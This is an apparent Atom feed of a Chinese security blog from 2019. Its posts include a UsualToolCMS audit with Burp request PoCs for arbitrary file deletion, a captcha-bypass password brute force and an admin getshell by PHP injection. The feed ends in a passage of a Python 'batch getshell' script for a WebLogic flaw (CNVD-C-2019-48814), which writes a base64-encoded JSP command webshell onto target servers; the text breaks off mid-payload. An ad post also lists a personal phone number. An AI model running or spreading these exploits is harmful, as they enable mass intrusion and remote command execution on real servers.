<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Fidcer&#39;Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://vuln.top/"/>
  <updated>2019-10-10T06:56:27.699Z</updated>
  <id>https://vuln.top/</id>
  
  <author>
    <name>Fidcer</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>豌豆杯入学ctf</title>
    <link href="https://vuln.top/2019/10/10/137/"/>
    <id>https://vuln.top/2019/10/10/137/</id>
    <published>2019-10-10T06:56:27.699Z</published>
    <updated>2019-10-10T06:56:27.699Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to my blog, enter password to read." />    <label for="pass">Welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>自己整理的信息收集1.0思维导图</title>
    <link href="https://vuln.top/2019/09/09/pentest/"/>
    <id>https://vuln.top/2019/09/09/pentest/</id>
    <published>2019-09-09T15:09:02.286Z</published>
    <updated>2019-09-09T15:40:40.690Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://vuln.top/2019/09/09/pentest/pentest.png" alt="信息收集"></p><p>最近花了一会整理的信息收集1.0，有些详细的内容还不是很全。用来给我自己当作一个备忘录年纪大了记性不好,有时间的话会持续更新。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://vuln.top/2019/09/09/pentest/pentest.png&quot; alt=&quot;信息收集&quot;&gt;&lt;/p&gt;
&lt;p&gt;最近花了一会整理的信息收集1.0，有些详细的内容还不是很全。用来给我自己当作一个备忘录年纪大了记性不好,有时间的话会持
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Uscms代码审计</title>
    <link href="https://vuln.top/2019/07/18/80/"/>
    <id>https://vuln.top/2019/07/18/80/</id>
    <published>2019-07-18T15:23:42.187Z</published>
    <updated>2019-07-18T15:23:42.188Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-第一处：前台任意文件删除"><a href="#0x01-第一处：前台任意文件删除" class="headerlink" title="0x01 第一处：前台任意文件删除"></a>0x01 第一处：前台任意文件删除</h1><p>漏洞信息：前台myup.php文件最后一段存在任意文件删除<br>代码：</p><p>漏洞点：<a href="http://xxx/myup.php" target="_blank" rel="noopener">http://xxx/myup.php</a></p><p><img src="http://118.126.66.150/52sec/uscmsimg/1.png" alt="1"></p><p>第47行只对<code>..</code>做了过滤,我仍然能任意删除网站内的文件，直接构造poc,</p><p><img src="http://118.126.66.150/52sec/uscmsimg/2.png" alt="2"></p><p><img src="http://118.126.66.150/52sec/uscmsimg/3.png" alt="3"></p><p>Burp POC：</p><p><img src="http://118.126.66.150/52sec/uscmsimg/4.png" alt="4"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /UsualToolCMS/myup.php HTTP/1.1</span><br><span class="line">Host: 192.168.235.242</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">X-Forwarded-For: 8.8.8.8</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 25</span><br><span class="line"></span><br><span class="line">get=delimg&amp;imgurl=./1.php</span><br></pre></td></tr></table></figure><h1 id="0x02-绕过后台验证码爆破"><a href="#0x02-绕过后台验证码爆破" class="headerlink" title="0x02 绕过后台验证码爆破"></a>0x02 绕过后台验证码爆破</h1><p>漏洞点:<a href="http://xxx.xxx.xxx.xxx/cmsadmin/" target="_blank" rel="noopener">http://xxx.xxx.xxx.xxx/cmsadmin/</a><br>后台登陆时默认需要输入验证码，但是当我把验证码的参数ucode删除时，登陆依然成功</p><p>1.默认情况下登陆数据包</p><p><img src="http://118.126.66.150/52sec/uscmsimg/2-1.png" alt="2-1"></p><p><img src="http://118.126.66.150/52sec/uscmsimg/2-2.png" alt="2-2"></p><p>删除ucode参数和cookie后登陆，直接登陆成功</p><p><img src="http://118.126.66.150/52sec/uscmsimg/2-3.png" alt="2-3"></p><p>通过burp爆破后台密码</p><p><img src="http://118.126.66.150/52sec/uscmsimg/2-4.png" alt="2-4"></p><p><img src="http://118.126.66.150/52sec/uscmsimg/2-5.png" alt="2-5"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /UsualToolCMS/cmsadmin/a_login.php?do=login HTTP/1.1</span><br><span class="line">Host: 192.168.235.242</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Referer: http://192.168.235.242/UsualToolCMS/cmsadmin/a_login.php</span><br><span class="line">X-Forwarded-For: 8.8.8.8</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 23</span><br><span class="line"></span><br><span class="line">uuser=admin&amp;upass=admin</span><br></pre></td></tr></table></figure><h1 id="0x03-后台GETSHELL"><a href="#0x03-后台GETSHELL" class="headerlink" title="0x03  后台GETSHELL"></a>0x03  后台GETSHELL</h1><p>漏洞点:<a href="http://xxx.xxx.xxx.xxx/cmsadmin/a_lang.php" target="_blank" rel="noopener">http://xxx.xxx.xxx.xxx/cmsadmin/a_lang.php</a><br>13行未对$lg做判断</p><p><img src="http://118.126.66.150/52sec/uscmsimg/3-1.png" alt="3-1"></p><p><img src="http://118.126.66.150/52sec/uscmsimg/3-2.png" alt="3-2"></p><p><img src="http://118.126.66.150/52sec/uscmsimg/3-3.png" alt="3-3"></p><p>点击保存时抓包需要修改url处的lg参数这样就上传到跟目录了，再在post 参数的en后面加入<code>en&quot;},&lt;?php phpinfo(); ?&gt;</code></p><p><img src="http://118.126.66.150/52sec/uscmsimg/3-4.png" alt="3-4"></p><p><img src="http://118.126.66.150/52sec/uscmsimg/3-5.png" alt="3-5"></p><p><img src="http://118.126.66.150/52sec/uscmsimg/3-6.png" alt="3-6"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /UsualToolCMS/cmsadmin/a_langx.php?x=m&amp;lg=../1.php HTTP/1.1</span><br><span class="line">Host: 192.168.235.242</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Referer: http://192.168.235.242/UsualToolCMS/cmsadmin/a_langx.php?lg=lg-en.json</span><br><span class="line">Cookie: navleft=21; UTCMSLanguage=zh; PHPSESSID=1r5kk3jieflfbnseav3e5dnclo</span><br><span class="line">X-Forwarded-For: 8.8.8.8</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 9189</span><br><span class="line"></span><br><span class="line">submit=%E4%BF%9D%E5%AD%98%E8%AF%AD%E8%A8%80%E5%8C%85&amp;keys%5B%5D=language&amp;values%5B%5D=en&quot;&#125;,&lt;?php phpinfo(); ?&gt;&amp;keys%5B%5D=charset&amp;values%5B%5D=utf-8&amp;keys%5B%5D=speak&amp;values%5B%5D=English&amp;keys%5B%5D=web&amp;values%5B%5D=UsualToolCMS&amp;key%5B%5D=index&amp;value%5B%5D=Home&amp;key%5B%5D=article&amp;value%5B%5D=Article&amp;key%5B%5D=product&amp;value%5B%5D=Product&amp;key%5B%5D=picture&amp;value%5B%5D=Picture&amp;key%5B%5D=atlas&amp;value%5B%5D=Atlas&amp;key%5B%5D=contact&amp;value%5B%5D=Contact&amp;key%5B%5D=about&amp;value%5B%5D=About&amp;key%5B%5D=forum&amp;value%5B%5D=Forum&amp;key%5B%5D=register&amp;value%5B%5D=Register&amp;key%5B%5D=login&amp;value%5B%5D=Login&amp;key%5B%5D=news&amp;value%5B%5D=News&amp;key%5B%5D=job&amp;value%5B%5D=Job&amp;key%5B%5D=wages&amp;value%5B%5D=Wages&amp;key%5B%5D=application&amp;value%5B%5D=Application&amp;key%5B%5D=resume&amp;value%5B%5D=Resume&amp;key%5B%5D=shopcart&amp;value%5B%5D=Shopcart&amp;key%5B%5D=account&amp;value%5B%5D=Account&amp;key%5B%5D=member&amp;value%5B%5D=Member&amp;key%5B%5D=up&amp;value%5B%5D=Up&amp;key%5B%5D=down&amp;value%5B%5D=Down&amp;key%5B%5D=more&amp;value%5B%5D=More&amp;key%5B%5D=new&amp;value%5B%5D=New&amp;key%5B%5D=authorize&amp;value%5B%5D=Authorize&amp;key%5B%5D=authenticating&amp;value%5B%5D=Authenticating&amp;key%5B%5D=qq&amp;value%5B%5D=QQ&amp;key%5B%5D=membercenter&amp;value%5B%5D=Member&amp;key%5B%5D=username&amp;value%5B%5D=Username&amp;key%5B%5D=password&amp;value%5B%5D=Password&amp;key%5B%5D=forgotpass&amp;value%5B%5D=Forgot&amp;key%5B%5D=search&amp;value%5B%5D=Search&amp;key%5B%5D=detail&amp;value%5B%5D=Detail&amp;key%5B%5D=size&amp;value%5B%5D=Size&amp;key%5B%5D=spec&amp;value%5B%5D=Spec&amp;key%5B%5D=color&amp;value%5B%5D=Color&amp;key%5B%5D=aboutus&amp;value%5B%5D=About+Us&amp;key%5B%5D=newgoods&amp;value%5B%5D=New+Product&amp;key%5B%5D=topgoods&amp;value%5B%5D=Top+Product&amp;key%5B%5D=link&amp;value%5B%5D=Link&amp;key%5B%5D=confirm&amp;value%5B%5D=Confirm&amp;key%5B%5D=email&amp;value%5B%5D=Email&amp;key%5B%5D=title&amp;value%5B%5D=Title&amp;key%5B%5D=content&amp;value%5B%5D=Content&amp;key%5B%5D=avatar&amp;value%5B%5D=Avatar&amp;key%5B%5D=sex&amp;value%5B%5D=Sex&amp;key%5B%5D=man&amp;value%5B%5D=Man&amp;key%5B%5D=woman&amp;value%5B%5D=Woman&amp;key%5B%5D=address&amp;value%5B%5D=ADD.&amp;key%5B%5D=tel&amp;value%5B%5D=Tel&amp;key%5B%5D=fax&amp;value%5B%5D=Fax&amp;key%5B%5D=introduction&amp;value%5B%5D=Intro&amp;key%5B%5D=validatecode&amp;value%5B%5D=Captcha&amp;key%5B%5D=changeit&amp;value%5B%5D=Change+it&amp;key%5B%5D=order&amp;value%5B%5D=Order&amp;key%5B%5D=writeorder&amp;value%5B%5D=Write+Order&amp;key%5B%5D=menu&amp;value%5B%5D=Menu&amp;key%5B%5D=balance&amp;value%5B%5D=Balance&amp;key%5B%5D=level&amp;value%5B%5D=Level&amp;key%5B%5D=writearticles&amp;value%5B%5D=Write+Articles&amp;key%5B%5D=articlemanagement&amp;value%5B%5D=Article+Admin&amp;key%5B%5D=articlebrowse&amp;value%5B%5D=Article+Browse&amp;key%5B%5D=writeonline&amp;value%5B%5D=Add+New&amp;key%5B%5D=payment&amp;value%5B%5D=Payment&amp;key%5B%5D=registrationtime&amp;value%5B%5D=Reg+Time&amp;key%5B%5D=lastlogintime&amp;value%5B%5D=Last+Login&amp;key%5B%5D=fullname&amp;value%5B%5D=Full+Name&amp;key%5B%5D=privileges%3Adiscount&amp;value%5B%5D=Privileges%3ADiscount&amp;key%5B%5D=state&amp;value%5B%5D=State&amp;key%5B%5D=source&amp;value%5B%5D=Source&amp;key%5B%5D=ordernumber&amp;value%5B%5D=Order+No.&amp;key%5B%5D=money&amp;value%5B%5D=Money&amp;key%5B%5D=time&amp;value%5B%5D=Time&amp;key%5B%5D=finish&amp;value%5B%5D=Finish&amp;key%5B%5D=unpaid&amp;value%5B%5D=Unpaid&amp;key%5B%5D=deliver&amp;value%5B%5D=Deliver&amp;key%5B%5D=refund&amp;value%5B%5D=Refund&amp;key%5B%5D=goods&amp;value%5B%5D=Goods&amp;key%5B%5D=charge&amp;value%5B%5D=Charge&amp;key%5B%5D=other&amp;value%5B%5D=Other&amp;key%5B%5D=ordertime&amp;value%5B%5D=Order+Time&amp;key%5B%5D=voucher&amp;value%5B%5D=Voucher&amp;key%5B%5D=customer&amp;value%5B%5D=Customer&amp;key%5B%5D=zipcode&amp;value%5B%5D=Zip+Code&amp;key%5B%5D=logistics&amp;value%5B%5D=Logistics&amp;key%5B%5D=logisticscompany&amp;value%5B%5D=Company&amp;key%5B%5D=logisticsnumber&amp;value%5B%5D=Number&amp;key%5B%5D=logisticsdetails&amp;value%5B%5D=Details&amp;key%5B%5D=paymentmethod&amp;value%5B%5D=Method&amp;key%5B%5D=alipay&amp;value%5B%5D=Alipay&amp;key%5B%5D=wechatpay&amp;value%5B%5D=Tencent+Wechat&amp;key%5B%5D=paypal&amp;value%5B%5D=Paypal&amp;key%5B%5D=waitinganswer&amp;value%5B%5D=Waiting&amp;key%5B%5D=answered&amp;value%5B%5D=Answered&amp;key%5B%5D=question&amp;value%5B%5D=Question&amp;key%5B%5D=reply&amp;value%5B%5D=Reply&amp;key%5B%5D=tencentaccount&amp;value%5B%5D=Tencent&amp;key%5B%5D=weiboaccount&amp;value%5B%5D=Weibo&amp;key%5B%5D=wechataccount&amp;value%5B%5D=Wechat&amp;key%5B%5D=binded&amp;value%5B%5D=Binded&amp;key%5B%5D=untie&amp;value%5B%5D=Untie&amp;key%5B%5D=quantity&amp;value%5B%5D=Qty&amp;key%5B%5D=parameter&amp;value%5B%5D=Parm&amp;key%5B%5D=total&amp;value%5B%5D=Total&amp;key%5B%5D=submit&amp;value%5B%5D=Submit&amp;key%5B%5D=delete&amp;value%5B%5D=Del&amp;key%5B%5D=unit&amp;value%5B%5D=USD&amp;key%5B%5D=actual&amp;value%5B%5D=Actual&amp;key%5B%5D=feedback&amp;value%5B%5D=Feedback&amp;key%5B%5D=otheraccount&amp;value%5B%5D=Other+Accounts&amp;key%5B%5D=out&amp;value%5B%5D=Out&amp;key%5B%5D=ranking&amp;value%5B%5D=Ranking&amp;key%5B%5D=recommend&amp;value%5B%5D=Recommend&amp;key%5B%5D=tag&amp;value%5B%5D=Tag&amp;key%5B%5D=tags&amp;value%5B%5D=Tags&amp;key%5B%5D=read&amp;value%5B%5D=Read&amp;key%5B%5D=productdetails&amp;value%5B%5D=Product+Details&amp;key%5B%5D=service&amp;value%5B%5D=Service&amp;key%5B%5D=category&amp;value%5B%5D=Category&amp;key%5B%5D=allcategory&amp;value%5B%5D=All+Category&amp;key%5B%5D=stock&amp;value%5B%5D=Stock&amp;key%5B%5D=price&amp;value%5B%5D=Price&amp;key%5B%5D=sale&amp;value%5B%5D=Sale&amp;key%5B%5D=loginview&amp;value%5B%5D=Login+View&amp;key%5B%5D=readme&amp;value%5B%5D=Read+Me&amp;key%5B%5D=popularity&amp;value%5B%5D=Popularity&amp;key%5B%5D=details&amp;value%5B%5D=Details&amp;key%5B%5D=message&amp;value%5B%5D=Message&amp;key%5B%5D=original&amp;value%5B%5D=Original&amp;key%5B%5D=author&amp;value%5B%5D=Author&amp;key%5B%5D=pass&amp;value%5B%5D=Pass&amp;key%5B%5D=audit&amp;value%5B%5D=Audit&amp;key%5B%5D=return&amp;value%5B%5D=Return&amp;key%5B%5D=yes&amp;value%5B%5D=Yes&amp;key%5B%5D=no&amp;value%5B%5D=No&amp;key%5B%5D=modify&amp;value%5B%5D=Modify&amp;key%5B%5D=articlemodify&amp;value%5B%5D=Article+Modify&amp;key%5B%5D=type&amp;value%5B%5D=Type&amp;key%5B%5D=moreupload&amp;value%5B%5D=Up+to+upload&amp;key%5B%5D=success&amp;value%5B%5D=Success&amp;key%5B%5D=fail&amp;value%5B%5D=Fail&amp;key%5B%5D=upload&amp;value%5B%5D=Upload&amp;key%5B%5D=uploadtime&amp;value%5B%5D=Upload+Time&amp;key%5B%5D=contactus&amp;value%5B%5D=Contact+Us&amp;key%5B%5D=previouspage&amp;value%5B%5D=Prev&amp;key%5B%5D=nextpage&amp;value%5B%5D=Next&amp;key%5B%5D=firstpage&amp;value%5B%5D=First&amp;key%5B%5D=lastpage&amp;value%5B%5D=Last&amp;key%5B%5D=totalpage&amp;value%5B%5D=Total&amp;key%5B%5D=currentpage&amp;value%5B%5D=Current&amp;key%5B%5D=buy&amp;value%5B%5D=Buy&amp;key%5B%5D=mailverify&amp;value%5B%5D=Email+validation&amp;key%5B%5D=welcome&amp;value%5B%5D=Welcome&amp;key%5B%5D=close&amp;value%5B%5D=closed&amp;key%5B%5D=findpassword&amp;value%5B%5D=Find+Password&amp;key%5B%5D=contactmanager&amp;value%5B%5D=Contact+Manager&amp;key%5B%5D=orderdetaillogin&amp;value%5B%5D=For+order+details%2Cplease+visit+the+website.&amp;key%5B%5D=enterusername&amp;value%5B%5D=Please+enter+username%21&amp;key%5B%5D=enterpassword&amp;value%5B%5D=Please+enter+password%21&amp;key%5B%5D=enteremail&amp;value%5B%5D=Please+enter+Email%21&amp;key%5B%5D=emailerr&amp;value%5B%5D=Email+error%21&amp;key%5B%5D=entertitle&amp;value%5B%5D=Please+enter+title%21&amp;key%5B%5D=entercontent&amp;value%5B%5D=Please+enter+content%21&amp;key%5B%5D=selecttype&amp;value%5B%5D=Type+must+be+selected%21&amp;key%5B%5D=enterauthor&amp;value%5B%5D=Please+enter+author%21&amp;key%5B%5D=enterpasswords&amp;value%5B%5D=Please+confirm+the+password%21&amp;key%5B%5D=passworderr&amp;value%5B%5D=The+codes+don&amp;key%5B%5D=entercaptcha&amp;value%5B%5D=Please+enter+captcha%21&amp;key%5B%5D=captchaerr&amp;value%5B%5D=Captcha+error%21&amp;key%5B%5D=mailsenderr&amp;value%5B%5D=Mail+not+sent%21&amp;key%5B%5D=mailok&amp;value%5B%5D=Please+check+email%21&amp;key%5B%5D=pleasemailverify&amp;value%5B%5D=Please+check+email+for+verification%21&amp;key%5B%5D=mailverifycode&amp;value%5B%5D=Email+Authentication+Code&amp;key%5B%5D=mailcopylink&amp;value%5B%5D=Please+copy+the+following+link&amp;key%5B%5D=totalnum&amp;value%5B%5D=Total+Num&amp;key%5B%5D=updateok&amp;value%5B%5D=Update+successed%21&amp;key%5B%5D=updateno&amp;value%5B%5D=Failed+to+update%21&amp;key%5B%5D=payok&amp;value%5B%5D=Successful+payment%21&amp;key%5B%5D=payno&amp;value%5B%5D=Payment+Failed%21&amp;key%5B%5D=createempty&amp;value%5B%5D=Required+field+is+empty%21&amp;key%5B%5D=createok&amp;value%5B%5D=Create+successed%21&amp;key%5B%5D=createno&amp;value%5B%5D=Failed+to+create%21&amp;key%5B%5D=gotopay&amp;value%5B%5D=Go+to+pay%21&amp;key%5B%5D=untieok&amp;value%5B%5D=Untie+successed%21&amp;key%5B%5D=untieno&amp;value%5B%5D=Untie+failed%21&amp;key%5B%5D=delok&amp;value%5B%5D=Delete+successed%21&amp;key%5B%5D=delno&amp;value%5B%5D=Delete+failed%21&amp;key%5B%5D=regclose&amp;value%5B%5D=Website+registration+closed%21&amp;key%5B%5D=regmailerr&amp;value%5B%5D=Account+or+email+registered%21&amp;key%5B%5D=loginusererr&amp;value%5B%5D=Account+does+not+exist%21&amp;key%5B%5D=loginpasserr&amp;value%5B%5D=Account+or+password+does+not+match%21&amp;key%5B%5D=administratorreply&amp;value%5B%5D=The+administrator+has+not+responded%2C+please+wait+patiently.&amp;key%5B%5D=noscript&amp;value%5B%5D=Sorry%2C+your+browser+disabled+JavaScript%2C+it+may+not+be+able+to+use+some+of+the+site&amp;key%5B%5D=readmecontent&amp;value%5B%5D=We+guarantee+that+the+outer+packing+of+the+goods+is+in+good+condition+at+the+time+of+shipment.+When+you+receive+the+goods%2C+please+carefully+check+whether+the+invoice+and+the+goods+are+consistent+with+the+delivery+order.+If+you+find+that+the+goods+are+missing+or+damaged%2C+please+contact+our+customer+service+department+on+the+spot+when+the+delivery+personnel+are+still+on+the+scene%3B+If+you+find+that+the+package+is+damaged+or+the+goods+are+damaged+in+transit%2C+please+point+out+and+refuse+to+accept+it+on+the+spot.+After+refusal%2C+please+call+our+customer+service.+If+you+have+signed+for+it+or+someone+else+has+signed+for+it%2C+you+will+be+considered+as+the+packaging%2C+quantity+and+content+of+the+goods.+I+will+not+be+able+to+accept.&amp;key%5B%5D=copyright&amp;value%5B%5D=Copyright&amp;key%5B%5D=cssdisplay&amp;value%5B%5D=none&amp;key%5B%5D=test&amp;value%5B%5D=Test</span><br></pre></td></tr></table></figure><p>##CSRF配合上面的后台getshell</p><p><img src="http://118.126.66.150/52sec/uscmsimg/4-1.png" alt="4-1"></p><p><img src="http://118.126.66.150/52sec/uscmsimg/4-2.png" alt="4-2"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x01-第一处：前台任意文件删除&quot;&gt;&lt;a href=&quot;#0x01-第一处：前台任意文件删除&quot; class=&quot;headerlink&quot; title=&quot;0x01 第一处：前台任意文件删除&quot;&gt;&lt;/a&gt;0x01 第一处：前台任意文件删除&lt;/h1&gt;&lt;p&gt;漏洞信息：前台myu
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>帮好朋友挂个广告</title>
    <link href="https://vuln.top/2019/07/18/100/"/>
    <id>https://vuln.top/2019/07/18/100/</id>
    <published>2019-07-18T15:10:21.494Z</published>
    <updated>2019-07-18T15:10:21.494Z</updated>
    
    <content type="html"><![CDATA[<p>他的博客：<a href="https://blog.csdn.net/qq_40478570/" target="_blank" rel="noopener">https://blog.csdn.net/qq_40478570/</a></p><p>博主现为上海思邱实业公司总经理，诚意招商</p><p>营业范围：联想戴尔等主流厂商服务器，办公电脑，显示器</p><p>华为华三思科等主流厂商数通产品，路由器，交换机，防火墙，无线等等</p><p>提供企业网络应急维修，网络周期性维护，服务器应急维修，服务器周期性维护，云计算部署，云存储部署等等各种各样的服务</p><p>只要你有IT行业相关的需求，那就可以联系我们</p><p>联系方式：17621969147 李先生</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;他的博客：&lt;a href=&quot;https://blog.csdn.net/qq_40478570/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://blog.csdn.net/qq_40478570/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;博主现为上海思邱实业
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>cnvd-c-2019-48814 批量getshell</title>
    <link href="https://vuln.top/2019/04/26/2019-48814/"/>
    <id>https://vuln.top/2019/04/26/2019-48814/</id>
    <published>2019-04-26T15:33:32.094Z</published>
    <updated>2019-04-26T15:57:42.113Z</updated>
    
    <content type="html"><![CDATA[<p>简单写一个通过 cnvd-c-2019-48814 批量getshell</p><p><code>扫描器可为个人和安全团队作为内部扫描器使用。扫描器切勿用于非法用途！！</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">#Author:fidcer</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">path=&apos;/_async/AsyncResponseService&apos;</span><br><span class="line"></span><br><span class="line">payload = &apos;&apos;&apos;</span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;   </span><br><span class="line">&lt;soapenv:Header&gt; </span><br><span class="line">&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;</span><br><span class="line">&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4= |base64 -d &gt; servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void 